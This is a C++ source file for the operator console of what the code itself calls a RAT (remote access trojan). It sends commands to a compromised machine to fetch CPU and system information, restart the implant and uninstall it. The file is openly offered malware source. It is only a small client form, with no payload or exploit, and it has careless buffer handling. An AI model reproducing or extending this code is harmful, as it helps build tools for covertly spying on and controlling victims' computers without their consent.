//---------------------------------------------------------------------------

#include <vcl.h>
#include <winsock.h>
#pragma hdrstop

#include "Unit3.h"
#include "Unit1.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm3 *Form3;
char szBuffer[4096],szIn[128000];
//---------------------------------------------------------------------------
__fastcall TForm3::TForm3(TComponent* Owner)
   : TForm(Owner)
{
}
//---------------------------------------------------------------------------


void __fastcall TForm3::Button1Click(TObject *Sender)
{
   char test[1024];
   char tok[] = "|";
   char *token;
   DWORD ret;
   SOCKADDR_IN *sin2;
   int sSin2 = sizeof(sin2);
   ZeroMemory(&szBuffer,4096);
   ZeroMemory(&szIn,128000);
   strcpy(szBuffer,"cpuinfo");
   send(infoclient,(const char *)szBuffer,strlen(szBuffer),0);
   ret = recv(infoclient,(char *)szIn,sizeof(szIn),0);
   if (ret==4294967295) {
      closesocket(infoclient);
   } else {
      strcpy(test,"Remote IP: ");
      //getpeername(infoclient,(SOCKADDR*) &sin2,&sSin2);
      //strcpy(test,inet_ntoa(sin2->sin_addr));
      //txtCpuInfo->Lines->Add(test);
      token = strtok(szIn,tok);
      while (token!=NULL) {
         txtCpuInfo->Lines->Add(token);
         token = strtok(NULL,tok);
      }
      ZeroMemory(&szIn,128000);
   }
}
//---------------------------------------------------------------------------

void __fastcall TForm3::btnUninstallClick(TObject *Sender)
{
   SuspendThread(hTimeThread);
   if (MessageBox(0,"Are you sure you want to remove this awesome RAT?","Check",MB_YESNO) == IDYES) {
      ZeroMemory(&szBuffer,2048);
      strcpy(szBuffer,"uninstall");
      send(infoclient,(const char *)szBuffer,strlen(szBuffer),0);
      recv(infoclient,(char *)szIn,sizeof(szIn),0);
      if (strcmp(szIn,"BYE") == 0) {
         ShowMessage("The server told me to say bye for it.");
      }
      closesocket(infoclient);
   } else {
      ShowMessage("Good choice.");
   }
   ResumeThread(hTimeThread);
}
//---------------------------------------------------------------------------
void __fastcall TForm3::btnRestartClick(TObject *Sender)
{
   SuspendThread(hTimeThread);
   if (MessageBox(0,"Are you sure you want to restart?","Check",MB_YESNO) == IDYES) {
      ZeroMemory(&szBuffer,2048);
      strcpy(szBuffer,"rstsrv");
      send(infoclient,(const char *)szBuffer,strlen(szBuffer),0);
      recv(infoclient,(char *)szIn,sizeof(szIn),0);
      if (strcmp(szIn,"BYE") == 0) {
         ShowMessage("Server restarted successfully.");
      }
      closesocket(infoclient);
   } else {
      ShowMessage("Ok.");
   }
   ResumeThread(hTimeThread);
}
//---------------------------------------------------------------------------


void __fastcall TForm3::Button3Click(TObject *Sender)
{
   txtCpuInfo->Clear();   
}
//---------------------------------------------------------------------------


